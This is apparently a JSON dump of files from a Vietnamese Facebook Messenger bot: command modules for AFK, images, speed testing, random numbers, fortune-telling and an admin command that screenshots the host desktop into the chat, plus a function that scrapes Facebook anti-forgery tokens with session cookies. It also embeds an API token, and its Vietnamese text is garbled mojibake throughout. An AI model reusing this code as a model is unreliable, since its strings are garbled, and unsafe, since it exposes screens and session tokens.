? ` v·ªõi l√Ω do: ${infoBusy.lido}.` : \".\"}`, threadID, messageID);\n        }\n    }\n}\n\nmodule.exports.run = async function({ api, event, args, Users }) {\n\tawait new Promise(resolve => setTimeout(resolve, 1000));\n    let busyData = JSON.parse(fs.readFileSync(busyPath));\n    const { threadID, senderID, messageID, body } = event;\n    var content = args.join(\" \") || \"\";\n    if (!(senderID in busyData)) {\n        busyData[senderID] = {\n            lido: content,\n            tag: []\n        }\n        fs.writeFileSync(busyPath, JSON.stringify(busyData, null, 4));\n        var msg = (content.length == 0) ? 'B·∫°n ƒë√£ b·∫≠t ch·∫ø ƒë·ªô afk m√† kh√¥ng c√≥ l√≠ do' : `B·∫°n ƒë√£ b·∫≠t ch·∫ø ƒë·ªô afk v·ªõi l√≠ do: ${content}`;\n        return api.sendMessage(msg, threadID, messageID);\n    }\n}","path":null,"size_bytes":2734,"size_tokens":null},"modules/commands/kurumi.js":{"content":"module.exports.config = {\n  name: \"kurumi\",\n  version: \"2.0.0\",\n  hasPermssion: 0,\n  credits: \"Vtuan\",\n  description: \"Xem ·∫£nh\",\n  commandCategory: \"Random-img\",\n  usages: \"\",\n  cooldowns: 30\n};\n\nmodule.exports.run = async ({ api, event ,Users}) => {\n  const axios = require('axios');\n  const request = require('request');\n  const fs = require(\"fs\");\n  const girl = require('./../../img/kurumi.json');\n  var image1 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image2 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image3 = girl[Math.floor(Math.random() * girl.length)].trim();\n  var image4 = girl[Math.floor(Math.random() * girl.length)].trim();\n  function downloadAndSendImage(image,fileName,callback){\n    request(image).pipe(fs.createWriteStream(__dirname + `/`+fileName)).on(\"close\", callback);\n  }\n  let callback = function () {\n    return api.sendMessage({\n      body: 'B√© kurumi cuti:3',\n      attachment: [\n       fs.createReadStream(__dirname + `/1.png`), \n       fs.createReadStream(__dirname + `/2.png`), \n       fs.createReadStream(__dirname + `/3.png`), \n       fs.createReadStream(__dirname + `/4.png`)\n      ]\n    }, event.threadID, () => {\n      fs.unlinkSync(__dirname + `/1.png`);\n      fs.unlinkSync(__dirname + `/2.png`);\n      fs.unlinkSync(__dirname + `/3.png`);\n      fs.unlinkSync(__dirname + `/4.png`);\n    }, event.messageID);\n  };\n  downloadAndSendImage(image1,'1.png',()=>{\n    downloadAndSendImage(image2,'2.png',()=>{\n      downloadAndSendImage(image3,'3.png',()=>{\n        downloadAndSendImage(image4,'4.png',callback)\n      })\n    })\n  }) \n}","path":null,"size_bytes":1608,"size_tokens":null},"modules/commands/speedtest.js":{"content":"module.exports.config = {\n    name: \"speedtest\",\n    version: \"1.0.0\",\n    hasPermssion: 3,\n    credits: \"Mirai Team\",\n    description: \"Ki·ªÉm tra t·ªëc ƒë·ªô m·∫°ng(bot)\",\n    commandCategory: \"H·ªá Th·ªëng\",\n    cooldowns: 15,\n    dependencies: {\n    \"fast-speedtest-api\": \"\"\n  }\n};\n\nmodule.exports.run = async function({ api, event }) {\n  try {\n    const fast = global.nodemodule[\"fast-speedtest-api\"];\n    const speedTest = new fast({\n      token: \"YXNkZmFzZGxmbnNkYWZoYXNkZmhrYWxm\",\n      verbose: false,\n      timeout: 10000,\n      https: true,\n      urlCount: 5,\n      bufferSize: 8,\n      unit: fast.UNITS.Mbps\n    });\n    const resault = await speedTest.getSpeed();\n    return api.sendMessage(\n      \"=== Result ===\" + \n      \"\\n- T·ªëc ƒë·ªô m·∫°ng: \" + resault + \" Mbps\",\n      event.threadID, event.messageID\n    );\n  }\n  catch {\n    return api.sendMessage(\"Kh√¥ng th·ªÉ speedtest ngay l√∫c n√†y, h√£y th·ª≠ l·∫°i sau!\", event.threadID, event.messageID);\n  }\n}","path":null,"size_bytes":973,"size_tokens":null},"modules/commands/random.js":{"content":"module.exports.config = {\n    name: 'random',\n    version: '1.0.1',\n    hasPermission: 1,\n    credits: 'TatsuYTB',\n    description: 'Random s·ªë',\n    commandCategory: 'C√¥ng c·ª•',\n    usages: 'random [s·ªë th·∫•p nh·∫•t] [s·ªë cao nh·∫•t]',\n    cooldowns: 0\n};\n\nmodule.exports.run = async function({ api, event, args }) {\n    const { threadID, messageID } = event;\n    const min = parseInt(args[0]);\n    const max = parseInt(args[1]);\n\n    if (isNaN(min) || isNaN(max)) {\n        return api.sendMessage('Vui l√≤ng nh·∫≠p s·ªë th·∫•p nh·∫•t v√† s·ªë cao nh·∫•t h·ª£p l·ªá.', threadID, messageID);\n    }\n\n    if (min >= max) {\n        return api.sendMessage('S·ªë th·∫•p nh·∫•t ph·∫£i nh·ªè h∆°n s·ªë cao nh·∫•t.', threadID, messageID);\n    }\n\n    const randomNumber = Math.floor(Math.random() * (max - min + 1)) + min;\n    return api.sendMessage(`K·∫øt qu·∫£: ${randomNumber}`, threadID, messageID);\n};","path":null,"size_bytes":903,"size_tokens":null},"modules/commands/sc.js":{"content":"const screenshot = require(\"screenshot-desktop\");\nconst fs = require(\"fs\");\nconst path = require(\"path\");\n\nmodule.exports.config = {\n    name: \"sc\",\n    version: \"1.0.1\",\n    hasPermssion: 3, \n    credits: \"TatsuYTB\",\n    description: \"Ch·ª•p ·∫£nh m√†n h√¨nh thi·∫øt b·ªã\",\n    commandCategory: \"H·ªá Th·ªëng\",\n    usages: \"screenshot\",\n    cooldowns: 10,\n};\n\nmodule.exports.run = async ({ api, event }) => {\n    try {\n        const savePath = path.join(__dirname, \"screenshot.jpg\");\n\n        await screenshot({ filename: savePath });\n        console.log(\"‚úÖ ·∫¢nh m√†n h√¨nh ƒë√£ ƒë∆∞·ª£c ch·ª•p.\");\n\n        if (fs.existsSync(savePath)) {\n            await api.sendMessage(\n                { body: \"·∫¢nh ch·ª•p m√†n h√¨nh c·ªßa thi·∫øt b·ªã:\", attachment: fs.createReadStream(savePath) },\n                event.threadID,\n                () => {\n                    fs.unlinkSync(savePath);\n                    console.log(\"·∫¢nh ch·ª•p m√†n h√¨nh ƒë√£ ƒë∆∞·ª£c x√≥a.\");\n                },\n                event.messageID\n            );\n        } else {\n            api.sendMessage(\"‚ùå Kh√¥ng t√¨m th·∫•y ·∫£nh ch·ª•p m√†n h√¨nh.\", event.threadID, event.messageID);\n        }\n    } catch (error) {\n        console.error(\"‚ùå L·ªói khi ch·ª•p ·∫£nh m√†n h√¨nh: \", error);\n        api.sendMessage(`‚ùå L·ªói khi ch·ª•p ·∫£nh m√†n h√¨nh: ${error.message}`, event.threadID, event.messageID);\n    }\n};\n","path":null,"size_bytes":1402,"size_tokens":null},"lib/fca-auto/src/refreshFb_dtsg.js":{"content":"\"use strict\";\n\nconst utils = require(\"../utils\");\nconst log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  /**\n   * Refreshes the fb_dtsg and jazoest values.\n   * @param {Function|Object} obj\n   * @param {Function} callback\n   * @returns {Promise}\n   */\n  return function refreshFb_dtsg(obj, callback) {\n    let resolveFunc = function () {};\n    let rejectFunc = function () {};\n    const returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (utils.getType(obj) === \"Function\" || utils.getType(obj) === \"AsyncFunction\") {\n      callback = obj;\n      obj = {};\n    }\n\n    if (!obj) obj = {};\n\n    if (utils.getType(obj) !== \"Object\") {\n      throw new utils.CustomError(\"the first parameter must be an object or a callback function\");\n    }\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    if (Object.keys(obj).length == 0) {\n      utils\n        .get(\"https://m.facebook.com/\", ctx.jar, null, ctx.globalOptions, { noRef: true })\n        .then(function (resData) {\n          const html = resData.body;\n\n          // T√¨m fb_dtsg theo nhi·ªÅu c√°ch\n          let fb_dtsg = utils.getFrom(html, 'name=\"fb_dtsg\" value=\"', '\"');\n          if (!fb_dtsg) fb_dtsg = utils.getFrom(html, '\"fb_dtsg\":\"', '\"');\n          if (!fb_dtsg) fb_dtsg = utils.getFrom(html, '\"DTSGInitialData\":{\"token\":\"', '\"');\n          if (!fb_dtsg) fb_dtsg = utils.getFrom(html, '\"token\":\"', '\"');\n\n          const jazoest = utils.getFrom(html, 'name=\"jazoest\" value=\"', '\"');\n\n          if (!fb_dtsg) {\n            require(\"fs\").writeFileSync(\"debug_fbdtsg.html\", html);\n            throw new utils.CustomError(\"‚ùå Kh√¥ng t√¨m th·∫•y fb_dtsg. HTML ƒë√£ l∆∞u v√†o debug_fbdtsg.html\");\n          }\n\n          ctx.fb_dtsg = fb_dtsg;\n          ctx.jazoest = jazoest;\n\n          callback(null, {\n            data: {\n              fb_dtsg: fb_dtsg,\n              jazoest: jazoest,\n            },\n            message: \"‚úÖ ƒê√£ l√†m m·ªõi fb_dtsg v√† jazoest\",\n          });\n        })\n        .catch(function (err) {\n          log.error(\"refreshFb_dtsg\", err);\n          return callback(err);\n        });\n    } else {\n      Object.keys(obj).forEach(function (key) {\n        ctx[key] = obj[key];\n      });\n\n      callback(null, {\n        data: obj,\n        message: \"refreshed \" + Object.keys(obj).join(\", \"),\n      });\n    }\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":2527,"size_tokens":null},"modules/commands/thayboi.js":{"content":"module.exports.config = {\n    name: \"thayboi\",\n    version: \"0.0.1\",\n    hasPermssion: 0,\n    credits: \"CatalizCS\",\n    description: \"B√≥i t√¨nh y√™u, s·ª± ngi·ªáp, cu·ªôc ƒë·ªùi\",\n    commandCategory: \"Nh√≥m\",\n    cooldowns: 5\n};\n\nmodule.exports.run = function ({ api, event }) {\n    const data = [\"Con b·ªëc ƒë∆∞·ª£c l√° 2 ‚ô• ƒê·ªÉ Th·∫ßy xem...Uhmm, m·ªôt qu√¢n b√†i r·∫•t t·ªët. N√≥ b√°o hi·ªáu r·∫±ng con s·∫Ω ƒë∆∞·ª£c ng∆∞·ªùi y√™u ho·∫∑c m·ªôt ng∆∞·ªùi m·∫øn m·ªô ·ªßng h·ªô v√† gi√∫p ƒë·ª°. Th·∫ø n√™n l√† an t√¢m con nh√°, c√≥ kh√≥ khƒÉn g√¨ th√¨ ng∆∞·ªùi ·∫•y c≈©ng th√¥ng c·∫£m v√† gi√∫p con m√†.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 2 ‚ô¶ ƒê·ªÉ Th·∫ßy xem...Hmm, qu√¢n n√†y n√≥ c√≥ kh√° nhi·ªÅu √Ω nghƒ©a ƒë·∫•y. C√≥ th·ªÉ l√† ƒëi·ªÅm b√°o v·ªÅ ƒë·ªëi t√°c l√†m ƒÉn, c≈©ng c√≥ khi l√† thay ƒë·ªïi trong quan h·ªá. Th·∫ßy nghƒ© con n√™n n√≥i chuy·ªán v·ªõi b·∫°n b√® v√† ƒë·ªìng nghi·ªáp ƒë·ªÉ hi·ªÉu r√µ h∆°n chuy·ªán g√¨ ƒëang x·∫£y ra con ·∫°.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 2 ‚ô£ ƒê·ªÉ Th·∫ßy xem...Hmm, qu√¢n n√†y b√°o hi·ªáu tr·ªü ng·∫°i con ·∫°. Con s·∫Ω c√≥ v√†i kh√≥ khƒÉn tr∆∞·ªõc khi th√†nh c√¥ng, v√† ph·∫£i ƒë·ªÅ ph√≤ng c√≥ k·∫ª tung tin ƒë·ªìn x·∫•u xa. Th·∫ßy nghƒ© l√† con ph·∫£i k√≠n ƒë√°o h∆°n, l√†m m·ªçi vi·ªác m·ªôt c√°ch c·∫©n th·∫≠n v√† chu ƒë√°o.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 2 ‚ô† ƒê·ªÉ Th·∫ßy xem...Ch·∫≠c‚Ä¶. Qu√¢n n√†y n√≥ ·ª©ng v·ªõi d·ªëi l·ª´a, ƒë·ªï v·ª° quan h·ªá. S·∫Øp t·ªõi con c√≥ th·ªÉ s·∫Ω ph·∫£i t·∫°m d·ª´ng m·ªôt vi·ªác quan tr·ªçng, m·ªôt m·ªëi quan h·ªá quan tr·ªçng n√†o ƒë√≥. ƒêi·ªÅu ƒë√≥ c√≥ th·ªÉ l√†m con bu·ªìn nh∆∞ng l√† n√≥ c·∫ßn thi·∫øt. N·∫øu con ƒëang bƒÉn khoƒÉn v·ªÅ m·ªôt m·ªëi t√¨nh, th√¨ qu√¢n n√†y n√≥ l√† ƒëi·ªÅm b√°o con s·∫Øp ph·∫£i chia ly ho·∫∑c ng∆∞·ªùi ·∫•y l√†m con th·∫•t v·ªçng. Th·∫ßy nghƒ© con n√™n thu x·∫øp ƒë·ªÉ ƒë∆∞·ª£c ngh·ªâ ng∆°i v√† th∆∞ gi√£n m·ªôt th·ªùi gian, r·ªìi con s·∫Ω ·ªïn.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 3 ‚ô• ƒê·ªÉ Th·∫ßy xem...Ch√†, qu√¢n n√†y √†, kh√≥ ƒë√¢y. N√≥ th∆∞·ªùng b√°o hi·ªáu chuy·ªán t√¨nh tay ba con ·∫°. Con s·∫Ω th·∫•y kh√≥ ch·ªçn l·ª±a t√¨nh y√™u ƒë√≠ch th·ª±c c·ªßa m√¨nh. T√¨nh c·∫£m kh√¥ng g∆∞·ª£ng √©p ƒë∆∞·ª£c, th·∫ø n√™n con h√£y th∆∞ gi√£n v√† ƒë·ªÉ cho chuy·ªán g√¨ ƒë·∫øn s·∫Ω ƒë·∫øn.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 3 ‚ô¶ ƒê·ªÉ Th·∫ßy xem...Ch√†‚Ä¶ Qu√¢n n√†y n√≥ li√™n quan ƒë·∫øn ph√°p lu·∫≠t con ·∫°. Th·ªùi gian n√†y th√¨ con ph·∫£i c·∫©n th·∫≠n, tr√°nh c√£i v√£, xung ƒë·ªôt nh√©. N·∫øu con c∆∞ x·ª≠ kh√©o l√©o, bi·∫øt tr∆∞·ªõc bi·∫øt sau th√¨ Th·∫ßy nghƒ© c≈©ng s·∫Ω kh√¥ng c√≥ v·∫•n ƒë·ªÅ g√¨ ƒë√¢u..\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 3 ‚ô£ ƒê·ªÉ Th·∫ßy xem...Oh, m·ªôt qu√¢n b√†i b√°o hi·ªáu t√¨nh y√™u v√† h·∫°nh ph√∫c. N·∫øu con mu·ªën c·∫ßu h√¥n ai th√¨ ƒë√¢y l√† th·ªùi ƒëi·ªÉm th√≠ch h·ª£p ƒë·∫•y. Ngo√†i ra, n√≥ c√≤n mang √Ω nghƒ©a l√† c∆° h·ªôi th·ª© hai n·ªØa. V·∫≠y n√™n n·∫øu c√≥ vi·ªác g√¨ tr∆∞·ªõc ƒë√¢y ch∆∞a th√†nh, m√† con mu·ªën th·ª≠ l·∫°i th√¨ h√£y ti·∫øn l√™n nh√©.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 3 ‚ô† ƒê·ªÉ Th·∫ßy xem...Uhmm, qu√¢n n√†y kh√¥ng ƒë∆∞·ª£c t·ªët, n√≥ t∆∞·ª£ng tr∆∞ng cho quan h·ªá ƒë·ªï v·ª° con ·∫°. Th·∫ßy nghƒ© l√† c√≥ th·ªÉ c√≥ ƒë·ª©a ƒë·ªãnh chen ngang v√†o m·ªëi quan h·ªá c·ªßa con. Trong th·ªùi gian n√†y con n√™n c·∫©n th·∫≠n, tr√°nh va ch·∫°m hay c√£i c·ªç l√†m ƒë·ªï v·ª° t·ªânh c·∫£m.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 4 ‚ô• ƒê·ªÉ Th·∫ßy xem...Hmmm, qu√¢n n√†y b√°o hi·ªáu thay ƒë·ªïi trong c√¥ng t√°c, nh√† c·ª≠a con ·∫°. C√≥ th·ªÉ s·∫Øp t·ªõi con s·∫Ω c√≥ thuy√™n chuy·ªÉn n∆°i c√¥ng t√°c ho·∫∑c l√† chuy·ªÉn nh√†. Th·∫ßy nghƒ© l√† con c·ª© n√™n d·ª± t√≠nh tr∆∞·ªõc kh√¥ng n√≥ l·∫°i c·∫≠p r·∫≠p.. \",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 4 ‚ô¶ ƒê·ªÉ Th·∫ßy xem...·∫§y, qu√¢n b√†i t·ªët con ·∫°, n√≥ b√°o ƒëi·ªÅm t√†i ch√≠nh con s·∫Øp ph·∫•t ƒë·∫øn n∆°i r·ªìi. Theo Th·∫ßy t√≠nh th√¨ con th·∫•y ∆∞ng v·ª• l√†m ƒÉn n√†o l√† chi·∫øn lu√¥n con ·∫°. Th√™m n·ªØa l√† con s·∫Ω nh·∫≠n ƒë∆∞·ª£c l·ªùi khuy√™n t·ªët t·ª´ ng∆∞·ªùi m·ªôt ng∆∞·ªùi ƒë·ª©ng tu·ªïi. N·∫øu con ch√∫ √Ω l·∫Øng nghe th√¨ s·∫Ω r·∫•t c√≥ l·ª£i ƒë·∫•y.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 4 ‚ô£ ƒê·ªÉ Th·∫ßy xem...ƒê√¢y l√† m·ªôt qu√¢n b√†i c·∫£nh b√°o. Theo Th·∫ßy t√≠nh th√¨ th·ªùi gian n√†y con ph·∫£i c·∫©n th·∫≠n kh√¥ng c√≥ ƒë·ª©a gian d·ªëi, ph·∫£n b·ªôi ƒë·∫•y. N·∫øu con m√† k√≠ c·ªçt g√¨ c≈©ng ph·∫£i ƒë·ªçc l·∫°i, kh√¥ng ch·ªß quan nghe ch∆∞a. Ch√∫c con may m·∫Øn!\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 4 ‚ô† ƒê·ªÉ Th·∫ßy xem...Con √†, qu√¢n n√†y n√≥ hay ƒëi li·ªÅn v·ªõi c·∫£ mu·ªôn phi·ªÅn, r·∫Øc r·ªëi. Th·∫ßy nghƒ© con n√™n c·∫©n th·∫≠n trong chi ti√™u, v·ªõi c·∫£ ƒë·ªÅ ph√≤ng m·∫•t c·ªßa. N√≥i chung th√¨ c≈©ng kh√¥ng c√≥ g√¨ nguy hi·ªÉm l·∫Øm, con c·ª© an t√¢m ƒë·ª´ng lo nghƒ© nhi·ªÅu, m·∫•y h√¥m n·ªØa v·∫≠n chuy·ªÉn sao d·ªùi m·ªçi th·ª© s·∫Ω ƒë√¢u v√†o ƒë·∫•y th√¥i.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 5 ‚ô• ƒê·ªÉ Th·∫ßy xem...Hmmm, qu√¢n n√†y b√°o con bi·∫øt l√† c√≥ ƒë·ª©a ƒëang ghen v·ªõi con ƒë·∫•y. C≈©ng ph·∫£i, ng∆∞·ªùi ƒë√°ng y√™u th√¨ bao gi·ªù ch·∫£ c√≥ ƒë·ª©a ghen t·ª©c h·∫£ con. Th·∫ßy nghƒ© l√† con c·ª© ƒë·ªÅ ph√≤ng m·ªôt t√≠, c≈©ng ch·∫£ h·∫°i g√¨.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 5 ‚ô¶ ƒê·ªÉ Th·∫ßy xem...√Ä, qu√¢n b√†i b√°o hi·ªáu th√†nh c√¥ng v√† h·∫°nh ph√∫c ƒë·∫•y con ·∫°. Theo Th·∫ßy t√≠nh th√¨ s·∫Øp t·ªõi con s·∫Ω c√≥ v√†i thay ƒë·ªïi theo h∆∞·ªõng t·ªët. Th·∫ßy nghƒ© l√† th·ªùi gian n√†y r·∫•t th√≠ch h·ª£p ƒë·ªÉ c√≥ em b√© ho·∫∑c l√† l√†m d·ª± √°n m·ªõi.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 5 ‚ô£ ƒê·ªÉ Th·∫ßy xem...Qu√¢n n√†y b√°o ƒëi·ªÅm l√†nh con ·∫°. S·∫Øp t·ªõi con s·∫Ω c√≥ nhi·ªÅu b·∫°n m·ªõi, nhi·ªÅu ng∆∞·ªùi gi√∫p ƒë√µ, nhi·ªÅu b·∫±ng h·ªØu t·ªët b·ª•ng. Th·∫ßy t√≠nh th√¨ con n√™n b·ªè nhi·ªÅu th·ªùi gian giao l∆∞u b·∫°n b√®, m·ªü r·ªông quan h·ªá v√† thi·∫øt ch·∫∑t t√¨nh b·∫°n c≈©. ƒêi·ªÅu ƒë√≥ s·∫Ω l√†m con vui v·∫ª v√† tho·∫£i m√°i.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 5 ‚ô† ƒê·ªÉ Th·∫ßy xem...√Ä, con n√†y c≈©ng kh√° ƒë∆∞·ª£c con ·∫°. Theo Th·∫ßy nghƒ© th√¨ con h∆°i bi quan v·ªõi t√¨nh h√¨nh th√¥i. Chuy√™n ƒë√¢u n√≥ c√≥ ƒë·∫•y, kh√≥ khƒÉn b√¢y gi·ªù ch·ªâ l√† t·∫°m th·ªùi th√¥i con ·∫°. Con c·ª© l·∫°c quan m√† vui s·ªëng nh√©!\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 6 ‚ô• ƒê·ªÉ Th·∫ßy xem...√Åi ch√†, qu√¢n n√†y b√°o hi·ªáu may m·∫Øn con ·∫°. May m·∫Øn n√†y ti·∫øp may m·∫Øn kia. C√≥ ng∆∞·ªùi mu·ªën chƒÉm s√≥c cho con. C√≥ ng∆∞·ªùi y√™u m·∫øn con. Con s·∫Ω th·∫•y ·∫•m √°p v√† tr√†n ƒë·∫ßy h·∫°nh ph√∫c. M·ªói t·ªôi l√† con ƒë·ª´ng n√™n ƒë√°nh b·∫°c l√∫c n√†y, ƒë·ªè t√¨nh th√¨ ƒëen b·∫°c m√†.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 6 ‚ô¶ ƒê·ªÉ Th·∫ßy xem...Uhmm‚Ä¶ qu√¢n n√†y √†, b√°o ƒëi·ªÅm tr·ª•c tr·∫∑c, c√£i v√£, chia ly con ·∫°. Th·ªùi gian n√†y chuy·ªán t√¨nh c·∫£m d·ªÖ x·∫£y ra m√¢u thu·∫´n, th·∫ø n√™n Th·∫ßy nghƒ© l√† con c·ª© ph·∫£i b√¨nh tƒ©nh, ƒëi·ªÅm ƒë·∫°m v√†o. C√≥ chuy·ªán g√¨ x·∫£y ra c≈©ng ƒë·ª´ng n·ªïi gi·∫≠n m√† t·ªïn h·∫°i s·ª©c kh·ªèe, nhan s·∫Øc nh√©.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 6 ‚ô£ ƒê·ªÉ Th·∫ßy xem...Hmm, qu√¢n n√†y n√≥ b√°o r·∫±ng con s·∫Øp c√≥ th√†nh c√¥ng trong t√†i ch√≠nh. Th·∫ßy t√≠nh th√¨ con s·∫Øp ƒë∆∞·ª£c ai ƒë√≥ cho ti·ªÅn, t√†i tr·ª£ ho·∫∑c gi√∫p ƒë·ª° t√†i ch√≠nh r·ªìi. C·ªë g·∫Øng l√†m vi·ªác v√† h·ªçc h√†nh chƒÉm ch·ªâ nh√©!\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 6 ‚ô† ƒê·ªÉ Th·∫ßy xem...Uhmm... Th·∫ßy nghƒ© l√† s·∫Øp t·ªõi con c√≥ v√†i thay ƒë·ªïi nh·ªè mang t√≠nh t√≠ch c·ª±c. Tuy nhi√™n c≈©ng kh√¥ng l·ªõn l·∫Øm con ·∫°. Th·∫ßy t√≠nh s·∫Øp t·ªõi m·ªçi chuy·ªán s·∫Ω ·ªïn ƒë·ªãnh v√† an l√†nh, con an t√¢m nh√©!\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 7 ‚ô• ƒê·ªÉ Th·∫ßy xem...Ch·∫≠c, qu√¢n n√†y t∆∞·ª£ng tr∆∞ng cho ng∆∞·ªùi kh√¥ng chung th·ªßy, t√¨nh c·∫£m hay thay ƒë·ªïi. C√≥ th·ªÉ s·∫Øp t·ªõi con s·∫Ω th·∫•y h∆°i b·ªã *th·∫•t t√¨nh* m·ªôt t√≠, nh·ªõ nhung ng∆∞·ªùi ta nhi·ªÅu m·ªôt t√≠ m√† nh·∫≠n l·∫°i ch·∫£ ƒë∆∞·ª£c bao nhi√™u... Nh∆∞ng kh√¥ng sao, b√¥i cao s·∫Ω kh·ªèi, Th·∫ßy nghƒ© l√† chuy·ªán ƒë√≥ qua c≈©ng nhanh th√¥i con ·∫°. L√∫c n√†y t√¢m tr·∫°ng ng∆∞·ªùi ta c≈©ng kh√¥ng ·ªïn ƒë·ªãnh, nh∆∞ng r·ªìi d·∫ßn d√† th√¨ t·ªânh c·∫£m c≈©ng s·∫Ω ch·∫Øc ch·∫Øn h∆°n...\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 7 ‚ô¶ ƒê·ªÉ Th·∫ßy xem...Ch·∫≠c ch·∫≠c‚Ä¶. Qu√¢n n√†y n√≥ b√°o ƒëi·ªÅm l√† s·∫Øp t·ªõi con s·∫Ω ph·∫£i c√£i nhau v·ªÅ chuy·ªán ti·ªÅn b·∫°c ho·∫∑c c√¥ng vi·ªác. Th·∫ßy nghƒ© l√† con n√™n chu·∫©n b·ªã tr∆∞·ªõc tinh th·∫ßn v·ªõi c·∫£ l√Ω l·∫Ω m·ªôt ch√∫t. Th∆∞·ªùng l√† chuy·ªán n√†y c≈©ng s·∫Ω √™m th·∫Øm ƒë√¢u ra ƒë·∫•y th√¥i con ·∫°, kh√¥ng c·∫ßn lo l·∫Øng l·∫Øm ƒë√¢u.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 7 ‚ô£ ƒê·ªÉ Th·∫ßy xem...·∫§y, qu√¢n n√†y b√°o hi·ªáu c√¥ng vi·ªác l√†m ƒÉn, h·ªçc h√†nh thu·∫≠n l·ª£i con ·∫°. Th·∫ßy t√≠nh l√† ch·∫≥ng m·∫•y ch·ªëc m√† con s·∫Ω thƒÉng ch·ª©c ho·∫∑c tƒÉng l∆∞∆°ng. Tuy nhi√™n con c√≥ th·ªÉ c√≥ v√†i r·∫Øc r·ªëi nho nh·ªè v·ªõi ng∆∞·ªùi kh√°c gi·ªõi.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 7 ‚ô† ƒê·ªÉ Th·∫ßy xem...Ch√† ch√†, ƒë·ªÉ Th·∫ßy nghƒ© ƒë√£... Con b·∫£y b√≠ch n√†y n√≥ l√† ƒëi·ªÅm b√°o r·∫±ng con s·∫Øp c√≥ ch√∫t kh√≥ khƒÉn. C√≥ th·ªÉ l√† con kh√¥ng nghe l·ªùi ng∆∞·ªùi kh√°c khuy√™n n√™n m·∫•t ƒëi c∆° h·ªôi. Kh√≥ khƒÉn x·∫£y ra c≈©ng ch·ªâ do con chu·ªëc l·∫•y th√¥i. Th·∫ø n√™n Th·∫ßy nghƒ© ch·ªâ c·∫ßn c·∫©n th·∫≠n v√† ch·ªãu l·∫Øng nghe th√¨ s·∫Ω ·ªïn con ·∫°.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 8 ‚ô• ƒê·ªÉ Th·∫ßy xem...Hehe, qu√¢n n√†y b√°o r·∫±ng con s·∫Øp ƒë∆∞·ª£c t·∫∑ng qu√† ho·∫∑c ƒë∆∞·ª£c r ƒëi ch∆°i. Vui l√™n con nh√°, Th·∫ßy nghƒ© l√† con s·∫Øm s·ª≠a qu·∫ßn √°o, ch·ªânh trang ƒë·∫ßu t√≥c ƒëi, s·∫Øp ƒë∆∞·ª£c ƒëi ch∆°i r·ªìi m√†.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 8 ‚ô¶ ƒê·ªÉ Th·∫ßy xem...Uhmm‚Ä¶ Qu√¢n n√†y n√≥ l√† ƒëi·ªÅm b√°o thay ƒë·ªïi trong c√¥ng vi·ªác con ·∫°. C√≥ th·ªÉ l√† con s·∫Ω t√¨m th·∫•y m·ªôt c√¥ng vi·ªác m·ªõi, ho·∫∑c l√† t√¨nh h√¨nh c√¥ng vi·ªác b√¢y gi·ªù s·∫Ω kh√°c. N·∫øu con ƒëi du l·ªãch hay c√¥ng t√°c trong th·ªùi gian n√†y th√¨ r·∫•t c√≥ th·ªÉ s·∫Ω t√¨m th·∫•y m·ªôt ng∆∞·ªùi kh√°c gi·ªõi h·∫•p d·∫´n. N√≥i chung Th·∫ßy nghƒ© l√† con s·∫Ω th·∫•y m·ªôt v√†i thay ƒë·ªïi nho nh·ªè v√† d·ªÖ ch·ªãu ƒë·∫•y.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 8 ‚ô£ ƒê·ªÉ Th·∫ßy xem...Ch√†, qu√¢n n√†y kh√¥ng ƒë∆∞·ª£c t·ªët con ·∫°. Con ph·∫£i c·∫©n th·∫≠n c√≥ k·∫ª ghen gh√©t trong c√¥ng vi·ªác. C√¥ng vi·ªác c·ªßa con c√≥ th·ªÉ s·∫Ω kh√¥ng ƒë∆∞·ª£c thu·∫≠n l·ª£i l·∫Øm, nh∆∞ng ƒë·ª´ng lo l·∫Øng qu√° v√¨ ch·ªâ c·∫ßn con t·ªânh t√°o th√¨ s·∫Ω ·ªïn.\",\n\n        \"Con b·ªëc ƒë∆∞·ª£c l√° 8 ‚ô† ƒê·ªÉ Th·∫ßy xem...Ch·∫πc, t√°m b√≠ch √†, ƒë·ªÉ Th·∫ßy nghƒ©... Con n√†y n√≥ nghƒ©a l√† s·ª± tham lam, kh√¥ng may, nguy hi·ªÉm, bu·ªìn r·∫ßu. N·∫øu con ƒëang suy t√≠nh chuy·ªán g√¨ th√¨ c≈©ng n√™n ghi nh·ªõ m√¨nh ph·∫£i c·∫©n th·∫≠n h∆°n nha. Th·∫ßy nghƒ© l√† c√≥ g√¨ c·∫£n tr·ªü th√¨ c≈©ng s·∫Ω qua, mi·ªÖn l√† con suy nghƒ© th·∫•u ƒë√°o v√† ch·∫•p 